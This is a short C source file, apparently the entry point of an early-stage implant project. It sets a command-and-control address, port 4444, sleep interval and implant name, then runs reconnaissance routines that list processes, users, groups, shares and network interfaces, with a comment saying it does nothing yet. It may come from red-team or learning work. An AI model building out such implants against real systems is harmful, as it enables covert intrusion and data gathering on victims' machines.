#include <stdio.h>
#include "config.h"
#include "recon.h"

int main(VOID)

{
	//doesn't do anything yet
	IMPLANT_CONFIG config = { "192.168.1.1", 4444, 60, "BASTILA" };
	printf("CONFIG: %s %d %d %s\n", config.c2ip, config.port, config.sleep_interval, config.implant_name);

	printf("\n===========PROCESSES===========\n");
	collect_processes();

	printf("\n===========USERS===========\n");
	collect_users_groups_shares();

	printf("\n===========NETWORK===========\n");
	collect_interfaces();
	 // add GetIpNetTable for the ARP cache 


	return 0;


}



